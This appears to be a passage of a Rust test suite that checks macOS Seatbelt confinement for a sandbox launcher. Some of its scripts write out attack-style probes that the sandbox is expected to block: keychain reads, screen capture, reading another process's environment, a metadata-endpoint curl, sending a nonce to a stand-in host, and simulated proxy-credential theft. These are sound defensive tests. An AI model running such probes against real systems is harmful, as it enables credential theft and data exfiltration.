//! FEP-5's macOS tests through `formwork run` against real Seatbelt (FEP-5 §6.3, §6.4): the
//! channel baseline, the isolation tier, environment disclosure, the loopback callback, the egress
//! endpoint's peer check, the brokered opener and discovery. Each follows FEP-5 §6.1: a control
//! run proves the channel is live on this runner, the confined run is denied with the Sandbox
//! record the unified log persisted, and markers are checked after the process tree has exited.

#![cfg(target_os = "macos")]

mod support;

use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Instant;

use support::*;

const DEFAULT: &str = "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\"]\n";

fn seatbelt_host(dir: &Path) -> bool {
    if host_profile(dir)["seatbelt"].as_bool() == Some(true) {
        return true;
    }
    not_exercised("Seatbelt unavailable");
    false
}

fn write_blueprint(dir: &Path, text: &str) {
    std::fs::write(dir.join("FORMWORK.toml"), text).unwrap();
}

fn report(dir: &Path, extra: &[&str]) -> serde_json::Value {
    let mut args = vec!["compile", "--report-only"];
    args.extend_from_slice(extra);
    let out = formwork(dir, &args, &[]);
    assert_eq!(out.code, 0, "{}", out.stderr);
    serde_json::from_str(&out.stdout).unwrap()
}

/// A minimal application bundle whose executable appends a line to `marker`, outside every
/// session's grants: what LaunchServices opening it looks like (FEP-5 §6.1, hermetic markers).
fn fixture_app(dir: &Path, marker: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let app = dir.join("FwFixture.app");
    std::fs::create_dir_all(app.join("Contents/MacOS")).unwrap();
    std::fs::write(
        app.join("Contents/Info.plist"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST \
         1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\
         <dict><key>CFBundleExecutable</key><string>fixture</string><key>CFBundleIdentifier</key>\
         <string>dev.formwork.fixture</string><key>CFBundlePackageType</key><string>APPL</string>\
         <key>LSUIElement</key><true/></dict></plist>\n",
    )
    .unwrap();
    let exe = app.join("Contents/MacOS/fixture");
    std::fs::write(
        &exe,
        format!("#!/bin/sh\necho launched >> '{}'\n", marker.display()),
    )
    .unwrap();
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    app
}

/// Wait up to `secs` for `path` to appear (an app LaunchServices started writes asynchronously).
fn appears(path: &Path, secs: u64) -> bool {
    let deadline = Instant::now() + std::time::Duration::from_secs(secs);
    while Instant::now() < deadline {
        if path.exists() {
            return true;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    path.exists()
}

fn sh(script: &str) -> std::process::Output {
    Command::new("/bin/sh")
        .args(["-c", script])
        .output()
        .unwrap()
}

/// FW-E2E-081 (macOS): under the default profile each host-service channel is denied with its
/// Sandbox record and no marker appears -- LaunchServices opening an app, a launchd job, an
/// AppleEvent asking System Events to create a folder, the clipboard, a screen capture and a test
/// keychain item -- each live in an unconfined control run first. `channels = ["clipboard"]` opens
/// the clipboard alone, and `allow-credentials = ["os-keyring"]` the keychain alone.
#[test]
fn fw_e2e_081_channels() {
    let dir = Scratch::new("mac-081");
    if !seatbelt_host(dir.path()) {
        return;
    }
    let outside = Scratch::new("mac-081-outside");
    let app = fixture_app(outside.path(), &outside.path().join("app-marker"));
    let keychain = dir.path().join("fw-081.keychain");
    let kc = keychain.to_str().unwrap();
    let label = format!("dev.formwork.e2e081.{}", std::process::id());
    let nonce = format!("clip-{}", std::process::id());
    assert!(sh(&format!(
        "security create-keychain -p pw '{kc}' && \
         security add-generic-password -s fw-081 -a fw -w keychain-secret '{kc}'"
    ))
    .status
    .success());
    write_blueprint(dir.path(), DEFAULT);
    // Each probe prints `<name>=<live>`; markers land in `outside`, which no session may write.
    let o = outside.path().display();
    let probes = format!(
        r#"/usr/bin/open -g -n '{app}' 2>/dev/null; sleep 2; [ -e '{o}/app-marker' ] && echo app=1 || echo app=0
launchctl submit -l {label} -- /bin/sh -c "echo job >> '{o}/job-marker'" 2>/dev/null; sleep 2; [ -e '{o}/job-marker' ] && echo job=1 || echo job=0
osascript -e 'tell application "System Events" to make new folder at end of folder "{o}" with properties {{name:"ae-marker"}}' >/dev/null 2>&1; [ -e '{o}/ae-marker' ] && echo ae=1 || echo ae=0
printf '{nonce}' | pbcopy 2>/dev/null && [ "$(pbpaste 2>/dev/null)" = '{nonce}' ] && echo clipboard=1 || echo clipboard=0
screencapture -x '{o}/shot.png' 2>/dev/null; [ -s '{o}/shot.png' ] && echo screen=1 || echo screen=0
[ "$(security find-generic-password -s fw-081 -w '{kc}' 2>/dev/null)" = keychain-secret ] && echo keychain=1 || echo keychain=0
"#,
        app = app.display()
    );
    let reset = || {
        for m in ["app-marker", "job-marker", "shot.png"] {
            let _ = std::fs::remove_file(outside.path().join(m));
        }
        let _ = std::fs::remove_dir(outside.path().join("ae-marker"));
        let _ = sh(&format!("launchctl remove {label} 2>/dev/null"));
        let _ = sh("printf '' | pbcopy");
    };

    // Control: every channel is live on this runner.
    let control = sh(&probes);
    let control = String::from_utf8_lossy(&control.stdout).into_owned();
    reset();
    for live in [
        "app=1",
        "job=1",
        "ae=1",
        "clipboard=1",
        "screen=1",
        "keychain=1",
    ] {
        assert!(
            control.contains(live),
            "control: {live} not live:\n{control}"
        );
    }

    let started = Instant::now();
    let denied = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", &probes], &[]);
    reset();
    assert_eq!(denied.code, 0, "{}", denied.stderr);
    for closed in [
        "app=0",
        "job=0",
        "ae=0",
        "clipboard=0",
        "screen=0",
        "keychain=0",
    ] {
        assert!(
            denied.stdout.contains(closed),
            "{closed}:\n{}",
            denied.stdout
        );
    }
    // The AppleEvent is stopped at its Mach lookup, before `appleevent-send` is asked.
    assert!(
        denied_since(started, "mach-lookup", "com.apple.coreservices.appleevents")
            || denied_since(started, "appleevent-send", ""),
        "no Sandbox record for the AppleEvent"
    );
    for (operation, argument) in [
        ("lsopen", ""),
        ("job-creation", ""),
        ("mach-lookup", "com.apple.pasteboard.1"),
        ("mach-lookup", "com.apple.windowserver.active"),
        ("mach-lookup", "com.apple.SecurityServer"),
    ] {
        assert!(
            denied_since(started, operation, argument),
            "no Sandbox record for {operation} {argument}"
        );
    }

    let clipboard = formwork(
        dir.path(),
        &[
            "run",
            "--set",
            "channels = [\"clipboard\"]",
            "--",
            "/bin/sh",
            "-c",
            &probes,
        ],
        &[],
    );
    reset();
    assert_eq!(clipboard.code, 0, "{}", clipboard.stderr);
    for want in [
        "app=0",
        "job=0",
        "ae=0",
        "clipboard=1",
        "screen=0",
        "keychain=0",
    ] {
        assert!(
            clipboard.stdout.contains(want),
            "clipboard lift, {want}:\n{}",
            clipboard.stdout
        );
    }

    let keyring = formwork(
        dir.path(),
        &[
            "run",
            "--set",
            "allow-credentials = [\"os-keyring\"]",
            "--",
            "/bin/sh",
            "-c",
            &probes,
        ],
        &[],
    );
    reset();
    let _ = sh(&format!("security delete-keychain '{kc}'"));
    assert_eq!(keyring.code, 0, "{}", keyring.stderr);
    for want in [
        "app=0",
        "job=0",
        "ae=0",
        "clipboard=0",
        "screen=0",
        "keychain=1",
    ] {
        assert!(
            keyring.stdout.contains(want),
            "keyring lift, {want}:\n{}",
            keyring.stdout
        );
    }

    // The report claims what was observed: the characterized channels enforced.
    let v = report(dir.path(), &[]);
    for channel in ["run-outside", "open-url", "clipboard", "screen"] {
        assert_eq!(
            v["per-capability"][format!("channel-{channel}")]["status"],
            "enforced",
            "{channel}: {}",
            v["per-capability"][format!("channel-{channel}")]
        );
    }
}

/// FW-E2E-080 (macOS): under `isolate = ["processes"]` a host process in another process group
/// can be neither signaled nor inspected, nor can `formwork` itself, while the session's own
/// process management works -- job control and a reparented descendant. The report says
/// `partial`, naming what stays visible: `pgrep` still lists the sibling, as the report says.
#[test]
fn fw_e2e_080_isolation_tier() {
    use std::os::unix::process::CommandExt;
    let dir = Scratch::new("mac-080");
    if !seatbelt_host(dir.path()) {
        return;
    }
    write_blueprint(dir.path(), &format!("{DEFAULT}isolate = [\"processes\"]\n"));
    let mut sibling = Command::new("/bin/sleep")
        .arg("60")
        .process_group(0)
        .spawn()
        .unwrap();
    let sib = sibling.id();
    let control = sh(&format!(
        "kill -0 {sib} && lsof -p {sib} >/dev/null && echo live"
    ));
    assert!(
        String::from_utf8_lossy(&control.stdout).contains("live"),
        "control: the sibling is signalable and inspectable unconfined"
    );
    let script = format!(
        r#"kill -USR1 {sib} 2>/dev/null && echo kill-sibling=1 || echo kill-sibling=0
lsof -p {sib} >/dev/null 2>&1 && echo info-sibling=1 || echo info-sibling=0
kill -0 $PPID 2>/dev/null && echo kill-parent=1 || echo kill-parent=0
sleep 30 & kill $! && wait $! ; echo job=$?
/bin/sh -c '/usr/bin/perl -e "setpgrp(0,0); sleep 30" & echo $! > "$TMPDIR/gc"'; sleep 0.3; kill "$(cat "$TMPDIR/gc")" && echo reparented=1 || echo reparented=0
pgrep -x sleep | grep -qx {sib} && echo listed=1 || echo listed=0
"#
    );
    let started = Instant::now();
    let out = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", &script], &[]);
    let survived = sibling.try_wait().unwrap().is_none();
    let _ = sibling.kill();
    let _ = sibling.wait();
    assert!(survived, "the session's SIGUSR1 reached the sibling");
    assert_eq!(out.code, 0, "{}", out.stderr);
    for want in [
        "kill-sibling=0",
        "info-sibling=0",
        "kill-parent=0",
        "job=143",
        "reparented=1",
        "listed=1",
    ] {
        assert!(out.stdout.contains(want), "{want}:\n{}", out.stdout);
    }
    assert!(
        denied_since(started, "signal", ""),
        "no Sandbox signal record"
    );
    let v = report(dir.path(), &[]);
    let line = &v["per-capability"]["isolate-processes"];
    assert_eq!(line["status"], "partial", "{line}");
    assert!(
        line["reason"].as_str().unwrap().contains("stay visible"),
        "the report names what pgrep showed: {line}"
    );
}

/// A reader of another process's exec-time environment through `kern.procargs2`, as `ps -E`
/// reads it; `ps` itself is setuid and no sandboxed process may exec it.
const PROCARGS: &str = r#"
import ctypes, sys
libc = ctypes.CDLL(None, use_errno=True)
needle = open(sys.argv[2][1:]).read() if sys.argv[2].startswith("@") else sys.argv[2]
mib = (ctypes.c_int * 3)(1, 49, int(sys.argv[1]))
size = ctypes.c_size_t(1 << 20)
buf = ctypes.create_string_buffer(size.value)
if libc.sysctl(mib, 3, buf, ctypes.byref(size), None, ctypes.c_size_t(0)) != 0:
    print(sys.argv[3] + "=unreadable")
else:
    print(sys.argv[3] + ("=seen" if needle.encode() in buf.raw[: size.value] else "=absent"))
"#;

/// FW-E2E-083 (macOS): the report and the observation agree. A same-uid sibling's exec-time
/// environment is readable from the session through `kern.procargs2`, which Seatbelt does not
/// mediate (characterization C5), and the report says `unenforceable`; `formwork`'s own
/// environment, which holds the operator's credentials, is not readable, because it zeroes it.
#[test]
fn fw_e2e_083_environment_disclosure_matches_the_report() {
    let dir = Scratch::new("mac-083");
    if !seatbelt_host(dir.path()) || !on_path("python3") {
        not_exercised("Seatbelt or python3 unavailable");
        return;
    }
    write_blueprint(dir.path(), DEFAULT);
    std::fs::write(dir.path().join("procargs.py"), PROCARGS).unwrap();
    let nonce = format!("canary-{}", std::process::id());
    let mut sibling = Command::new("/bin/sleep")
        .arg("30")
        .env("FW_CANARY", &nonce)
        .spawn()
        .unwrap();
    std::thread::sleep(std::time::Duration::from_millis(300));
    let control = Command::new("python3")
        .args(["procargs.py", &sibling.id().to_string(), &nonce, "control"])
        .current_dir(dir.path())
        .output()
        .unwrap();
    assert_eq!(
        String::from_utf8_lossy(&control.stdout).trim(),
        "control=seen",
        "control: the canary is live"
    );
    // The needle reaches the reader through a file: on the command line it would be in
    // `formwork`'s own argv, which `kern.procargs2` returns too.
    let secret = format!("gateway-secret-{}", std::process::id());
    std::fs::write(dir.path().join("needle"), &secret).unwrap();
    let script = format!(
        "python3 procargs.py {} {nonce} sibling; python3 procargs.py $PPID @needle gateway",
        sibling.id()
    );
    let out = formwork(
        dir.path(),
        &["run", "--", "/bin/sh", "-c", &script],
        &[("FW_OPERATOR_TOKEN", &secret)],
    );
    let _ = sibling.kill();
    let _ = sibling.wait();
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert!(out.stdout.contains("sibling=seen"), "{}", out.stdout);
    assert!(
        out.stdout.contains("gateway=absent"),
        "formwork's own environment is concealed: {}",
        out.stdout
    );
    let v = report(dir.path(), &[]);
    let line = &v["per-capability"]["process-environment"];
    assert_eq!(line["status"], "unenforceable", "{line}");
}

/// FW-E2E-091 (macOS): a confined process listens on loopback and an unconfined process connects
/// and hands it a nonce, under `net = "deny"`, a port tier and a host rule. Characterization C1:
/// the same grant lets a listener on the wildcard address accept a connection to the host's own
/// network address, which the report states (`net-default-deny` partial, naming FW-EGR15).
#[test]
fn fw_e2e_091_loopback_callback() {
    let dir = Scratch::new("mac-091");
    if !seatbelt_host(dir.path()) || !on_path("python3") {
        not_exercised("Seatbelt or python3 unavailable");
        return;
    }
    let listener = |bind: &str| {
        format!(
            "import socket\ns = socket.socket()\ns.bind(('{bind}', 0))\ns.listen(1)\n\
             open('port.tmp', 'w').write(str(s.getsockname()[1]))\n\
             __import__('os').rename('port.tmp', 'port')\ns.settimeout(20)\n\
             c, _ = s.accept()\nprint('received', c.recv(64).decode())\n"
        )
    };
    let lan = sh("ipconfig getifaddr en0 || ipconfig getifaddr en1");
    let lan = String::from_utf8_lossy(&lan.stdout).trim().to_string();
    let mut cases = vec![
        ("net = \"deny\"\n", "127.0.0.1", "127.0.0.1".to_string()),
        (
            "net = { ports = [443] }\n",
            "127.0.0.1",
            "127.0.0.1".to_string(),
        ),
        (
            "rules = [\"readwrite:$CWD/**\", \"allow:example.test\"]\n",
            "127.0.0.1",
            "127.0.0.1".to_string(),
        ),
    ];
    if !lan.is_empty() {
        cases.push(("net = \"deny\"\n", "0.0.0.0", lan.clone()));
    }
    for (posture, bind, connect) in cases {
        let blueprint = if posture.starts_with("rules") {
            format!("extends = [\"builtin:default\"]\n{posture}")
        } else {
            format!("{DEFAULT}{posture}")
        };
        write_blueprint(dir.path(), &blueprint);
        std::fs::write(dir.path().join("listen.py"), listener(bind)).unwrap();
        let _ = std::fs::remove_file(dir.path().join("port"));
        let nonce = format!("nonce-{}", std::process::id());
        let root = dir.path().to_path_buf();
        let client = {
            let nonce = nonce.clone();
            std::thread::spawn(move || {
                let port_file = root.join("port");
                let deadline = Instant::now() + std::time::Duration::from_secs(20);
                while !port_file.exists() && Instant::now() < deadline {
                    std::thread::sleep(std::time::Duration::from_millis(50));
                }
                let port: u16 = std::fs::read_to_string(&port_file)
                    .unwrap_or_default()
                    .trim()
                    .parse()
                    .unwrap_or(0);
                let mut s = std::net::TcpStream::connect((connect.as_str(), port)).ok()?;
                std::io::Write::write_all(&mut s, nonce.as_bytes()).ok()
            })
        };
        let case_started = Instant::now();
        let out = formwork(dir.path(), &["run", "--", "python3", "listen.py"], &[]);
        let sent = client.join().unwrap();
        if sent.is_none() {
            // Whether Seatbelt refused the listener, and under which rule (seen once on macos-14:
            // a bind to 127.0.0.1:0 refused under `localhost:*`).
            let records = sandbox_records(case_started, |m| {
                m.contains(" deny(") && m.contains("python") && m.contains("network")
            });
            panic!(
                "{posture} {bind}: the client could not connect\n{}\nSandbox records: {records:#?}",
                out.stderr
            );
        }
        assert_eq!(out.code, 0, "{posture} {bind}: {}", out.stderr);
        assert_eq!(
            out.stdout.trim(),
            format!("received {nonce}"),
            "{posture} {bind}"
        );
    }
    write_blueprint(dir.path(), DEFAULT);
    let v = report(dir.path(), &[]);
    let line = &v["per-capability"]["net-default-deny"];
    assert_eq!(line["status"], "partial", "{line}");
    assert!(
        line["reason"].as_str().unwrap().contains("FW-EGR15"),
        "{line}"
    );
}

/// A loopback HTTP upstream that answers every request with `upstream-ok` and counts requests.
fn http_fixture() -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let c = count.clone();
    std::thread::spawn(move || {
        for mut s in listener.incoming().flatten() {
            c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            let _ = s.set_read_timeout(Some(std::time::Duration::from_millis(500)));
            let mut buf = [0u8; 2048];
            let _ = s.read(&mut buf);
            let _ = s.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Length: 12\r\nConnection: close\r\n\r\nupstream-ok\n",
            );
        }
    });
    (port, count)
}

/// FW-E2E-075 (macOS): the Gateway is the session's only way out. A request through the proxy
/// variables reaches the upstream; the same request with the proxy bypassed, a connection to the
/// metadata address, a UDP send and a name lookup are each refused by Seatbelt with a Sandbox
/// record; a host no rule names gets the Gateway's generic 403 and an operator line. The direct
/// connects use the system curl: Seatbelt refuses a Homebrew or locally built client's connect
/// all the same, but on the hosted runners leaves no record of it (docs/macos-characterization.md),
/// and Homebrew's curl is first on the Intel runner's `PATH`.
#[test]
fn fw_e2e_075_sole_egress_path() {
    let dir = Scratch::new("mac-075");
    if !seatbelt_host(dir.path()) || !on_path("curl") || !on_path("python3") {
        not_exercised("Seatbelt, curl or python3 unavailable");
        return;
    }
    let (port, hits) = http_fixture();
    write_blueprint(
        dir.path(),
        &format!(
            "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\", \"allow:127.0.0.1:{port}\"]\n"
        ),
    );
    let url = format!("http://127.0.0.1:{port}/");
    let script = format!(
        r#"curl -sS -m 5 {url}
/usr/bin/curl -sS -m 5 --noproxy '*' {url} >/dev/null 2>&1; echo bypass=$?
curl -sS -m 5 --noproxy '*' {url} >/dev/null 2>&1; echo path-bypass=$?
/usr/bin/curl -sS -m 5 --noproxy '*' http://169.254.169.254/latest >/dev/null 2>&1; echo metadata=$?
python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("127.0.0.1", 53))' 2>/dev/null; echo udp=$?
python3 -c 'import socket; socket.getaddrinfo("blocked.test", 443)' 2>/dev/null; echo resolve=$?
curl -sS -m 5 http://127.0.0.2:9/
"#
    );
    let started = Instant::now();
    let out = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", &script], &[]);
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert!(out.stdout.starts_with("upstream-ok\n"), "{}", out.stdout);
    for refused in [
        "bypass=7",
        "path-bypass=7",
        "metadata=7",
        "udp=1",
        "resolve=1",
    ] {
        assert!(out.stdout.contains(refused), "{refused}:\n{}", out.stdout);
    }
    assert_eq!(
        hits.load(std::sync::atomic::Ordering::SeqCst),
        1,
        "only the proxied request reached the upstream"
    );
    assert!(
        out.stdout.contains("denied by formwork policy"),
        "{}",
        out.stdout
    );
    assert!(
        out.stderr.contains("reason=\"host-not-listed\""),
        "{}",
        out.stderr
    );
    assert!(
        denied_since(started, "network-outbound", ""),
        "no Sandbox record for the direct connects"
    );
}

/// FW-ADV-019 (macOS): an unconfined same-uid process holding the listener's port and the
/// session's proxy credential -- read from the workload, as a process that reads the agent's
/// environment would -- connects to the listener. The peer check refuses it before a byte while
/// the session's own request is served, and the report says `net-host-scope` enforced.
#[test]
fn fw_adv_019_endpoint_theft() {
    use std::io::{Read, Write};
    let dir = Scratch::new("mac-adv019");
    if !seatbelt_host(dir.path()) || !on_path("curl") {
        not_exercised("Seatbelt or curl unavailable");
        return;
    }
    let (port, hits) = http_fixture();
    write_blueprint(
        dir.path(),
        &format!(
            "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\", \"allow:127.0.0.1:{port}\"]\n"
        ),
    );
    let root = dir.path().to_path_buf();
    let thief = std::thread::spawn(move || {
        let file = root.join("proxy");
        let deadline = Instant::now() + std::time::Duration::from_secs(20);
        while !file.exists() && Instant::now() < deadline {
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
        // http://fw:<credential>@127.0.0.1:<port>
        let url = std::fs::read_to_string(&file).unwrap();
        let rest = url.trim().strip_prefix("http://").unwrap();
        let (userinfo, authority) = rest.split_once('@').unwrap();
        let basic = base64(userinfo.as_bytes());
        let mut s = std::net::TcpStream::connect(authority.trim_end_matches('/')).unwrap();
        let _ = s.set_read_timeout(Some(std::time::Duration::from_secs(5)));
        let _ = write!(
            s,
            "GET http://127.0.0.1:{port}/stolen HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\
             Proxy-Authorization: Basic {basic}\r\n\r\n"
        );
        let mut answer = Vec::new();
        let _ = s.read_to_end(&mut answer);
        String::from_utf8_lossy(&answer).into_owned()
    });
    let script = format!(
        "printf '%s' \"$http_proxy\" > proxy; sleep 4; curl -sS -m 5 http://127.0.0.1:{port}/own"
    );
    let out = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", &script], &[]);
    let stolen = thief.join().unwrap();
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert_eq!(
        out.stdout, "upstream-ok\n",
        "the session's own request is served"
    );
    assert!(stolen.is_empty(), "the thief got an answer: {stolen}");
    assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
    assert!(
        out.stderr.contains("no session process holds"),
        "{}",
        out.stderr
    );
    let v = report(dir.path(), &[]);
    assert_eq!(v["per-capability"]["net-host-scope"]["status"], "enforced");
}

fn base64(bytes: &[u8]) -> String {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
        for i in 0..4 {
            if i <= chunk.len() {
                out.push(T[((n >> (18 - 6 * i)) & 63) as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

/// A host opener that appends each URL it is asked to open to `<dir>/opened`.
fn opener_fixture(dir: &Path) -> (PathBuf, PathBuf) {
    use std::os::unix::fs::PermissionsExt;
    let log = dir.join("opened");
    let fixture = dir.join("fixture-opener");
    std::fs::write(
        &fixture,
        format!("#!/bin/sh\nprintf '%s\\n' \"$1\" >> '{}'\n", log.display()),
    )
    .unwrap();
    std::fs::set_permissions(&fixture, std::fs::Permissions::from_mode(0o700)).unwrap();
    (fixture, log)
}

fn read_after_exit(log: &Path) -> String {
    let deadline = Instant::now() + std::time::Duration::from_secs(3);
    while !log.exists() && Instant::now() < deadline {
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    std::fs::read_to_string(log).unwrap_or_default()
}

/// FW-E2E-090 (macOS): under `channels = ["open-url"]` the confined `open` of an `https://` URL is
/// the opener shim, and the host opener receives it; a `file:` URL is refused; LaunchServices
/// itself stays denied (`/usr/bin/open` of an app), with its Sandbox record.
#[test]
fn fw_e2e_090_brokered_open_url() {
    let dir = Scratch::new("mac-090");
    if !seatbelt_host(dir.path()) {
        return;
    }
    let outside = Scratch::new("mac-090-outside");
    let (fixture, log) = opener_fixture(outside.path());
    let app = fixture_app(outside.path(), &outside.path().join("app-marker"));
    write_blueprint(dir.path(), &format!("{DEFAULT}channels = [\"open-url\"]\n"));
    let script = format!(
        "open https://example.test/login; echo \"https=$?\"; open file:///etc/passwd; \
         echo \"file=$?\"; /usr/bin/open -g -n '{}' 2>/dev/null; echo \"launchservices=$?\"",
        app.display()
    );
    let started = Instant::now();
    let out = formwork(
        dir.path(),
        &["run", "--", "/bin/sh", "-c", &script],
        &[("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())],
    );
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert!(out.stdout.contains("https=0\nfile=1\n"), "{}", out.stdout);
    assert!(!out.stdout.contains("launchservices=0"), "{}", out.stdout);
    assert_eq!(read_after_exit(&log), "https://example.test/login\n");
    assert!(!appears(&outside.path().join("app-marker"), 2));
    assert!(out.stderr.contains("opened a URL"), "{}", out.stderr);
    assert!(
        denied_since(started, "lsopen", ""),
        "no Sandbox lsopen record"
    );
}

/// FW-ADV-020 (macOS): with `open-url` not lifted, a nonce never leaves through a host service:
/// not through the opener (`open`, `$BROWSER`), LaunchServices, an AppleEvent, or the clipboard
/// handed to an unconfined reader. Checked after the process tree exits.
#[test]
fn fw_adv_020_no_exfiltration_through_host_services() {
    let dir = Scratch::new("mac-adv020");
    if !seatbelt_host(dir.path()) {
        return;
    }
    let outside = Scratch::new("mac-adv020-outside");
    let (fixture, log) = opener_fixture(outside.path());
    write_blueprint(dir.path(), DEFAULT);
    let nonce = format!("nonce-{}", std::process::id());
    let _ = sh("printf '' | pbcopy");
    let script = format!(
        r#"open "https://blocked.test/?q={nonce}"; "$BROWSER" "https://blocked.test/?q={nonce}"
/usr/bin/open "https://blocked.test/?q={nonce}" 2>/dev/null
osascript -e 'tell application "System Events" to open location "https://blocked.test/?q={nonce}"' 2>/dev/null
printf '{nonce}' | pbcopy 2>/dev/null; true"#
    );
    let out = formwork(
        dir.path(),
        &["run", "--", "/bin/sh", "-c", &script],
        &[("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())],
    );
    assert_eq!(out.code, 0, "{}", out.stderr);
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(
        !log.exists(),
        "the host opener ran: {}",
        read_after_exit(&log)
    );
    let pasted = sh("pbpaste");
    assert!(
        !String::from_utf8_lossy(&pasted.stdout).contains(&nonce),
        "the nonce reached the host clipboard"
    );
    assert!(out.stderr.contains("not lifted"), "{}", out.stderr);
}

/// FW-E2E-088 (macOS): `channels = ["desktop"]` lifts the clipboard and URL opening; screen
/// capture and run-outside stay denied. A downstream `channels = { deny = ["desktop"] }` closes
/// both again, and `explain desktop` names the denying layer.
#[test]
fn fw_e2e_088_channel_groups() {
    let dir = Scratch::new("mac-088");
    if !seatbelt_host(dir.path()) {
        return;
    }
    let outside = Scratch::new("mac-088-outside");
    let (fixture, log) = opener_fixture(outside.path());
    let o = outside.path().display();
    let nonce = format!("clip-{}", std::process::id());
    let probes = format!(
        r#"printf '{nonce}' | pbcopy 2>/dev/null && [ "$(pbpaste 2>/dev/null)" = '{nonce}' ] && echo clipboard=1 || echo clipboard=0
open https://example.test/desktop >/dev/null 2>&1 && echo url=1 || echo url=0
screencapture -x '{o}/shot.png' 2>/dev/null; [ -s '{o}/shot.png' ] && echo screen=1 || echo screen=0
osascript -e 'tell application "System Events" to make new folder at end of folder "{o}" with properties {{name:"ae"}}' >/dev/null 2>&1; [ -e '{o}/ae' ] && echo ae=1 || echo ae=0
"#
    );
    let env = [("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())];
    write_blueprint(dir.path(), &format!("{DEFAULT}channels = [\"desktop\"]\n"));
    let lifted = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", &probes], &env);
    assert_eq!(lifted.code, 0, "{}", lifted.stderr);
    for want in ["clipboard=1", "url=1", "screen=0", "ae=0"] {
        assert!(lifted.stdout.contains(want), "{want}:\n{}", lifted.stdout);
    }
    assert_eq!(read_after_exit(&log), "https://example.test/desktop\n");

    // A downstream layer denies the group again.
    let deny = "channels = { deny = [\"desktop\"] }";
    let denied = formwork(
        dir.path(),
        &["run", "--set", deny, "--", "/bin/sh", "-c", &probes],
        &env,
    );
    assert_eq!(denied.code, 0, "{}", denied.stderr);
    for want in ["clipboard=0", "url=0"] {
        assert!(denied.stdout.contains(want), "{want}:\n{}", denied.stdout);
    }
    let explained = formwork(dir.path(), &["explain", "--set", deny, "desktop"], &[]);
    for member in ["clipboard", "open-url"] {
        assert!(
            explained.stdout.contains(&format!(
                "verdict: denied by channels deny {member} (cli override)"
            )),
            "{}",
            explained.stdout
        );
    }
    let _ = sh("printf '' | pbcopy");
}

/// FW-E2E-089 (macOS): under `mode = "unveil"` with only the project granted, `$TMPDIR` names the
/// per-session directory, which is writable and removed after the run; a grandchild reads
/// `/etc/hosts` and the session's trust bundle; the operator channel names both. The per-user
/// directory `confstr(_CS_DARWIN_USER_TEMP_DIR)` returns is not redirected by `TMPDIR`
/// (characterized), so it is not granted and not the session's.
#[test]
fn fw_e2e_089_launcher_owned_paths_under_closed_mode() {
    let dir = Scratch::new("mac-089");
    if !seatbelt_host(dir.path()) {
        return;
    }
    write_blueprint(
        dir.path(),
        "mode = \"unveil\"\nrules = [\"readwrite:$CWD/**\", \"allow:example.test\"]\n",
    );
    let script = r#"set -e
test -n "$TMPDIR" && test "$TMPDIR" = "$TMP" && test "$TMPDIR" = "$TEMP"
echo scratch > "$TMPDIR/f"
/bin/sh -c 'cat /etc/hosts > /dev/null && head -1 "$SSL_CERT_FILE"'
user_tmp=$(getconf DARWIN_USER_TEMP_DIR)
( echo x > "$user_tmp/formwork-089-probe" ) 2>/dev/null && echo user-tmp-writable || echo user-tmp-closed
printf '%s\n' "$TMPDIR"
"#;
    let out = formwork(dir.path(), &["run", "--", "/bin/sh", "-c", script], &[]);
    assert_eq!(out.code, 0, "stdout={} stderr={}", out.stdout, out.stderr);
    assert!(
        out.stdout.contains("-----BEGIN CERTIFICATE-----"),
        "{}",
        out.stdout
    );
    assert!(out.stdout.contains("user-tmp-closed"), "{}", out.stdout);
    let tmp = out.stdout.lines().last().unwrap();
    assert!(tmp.contains("formwork-session-"), "{tmp}");
    assert!(
        !Path::new(tmp).exists(),
        "the session temp directory is removed"
    );
    assert!(
        out.stderr.contains("session temp directory"),
        "{}",
        out.stderr
    );
}

/// FW-E2E-085 (macOS): a learning run under host rules proposes `allow:blocked.test` from the
/// Gateway's refusal and `clipboard` from the Sandbox record of a denied pasteboard lookup,
/// withholds the metadata address, and the accepted entries apply from the next run.
#[test]
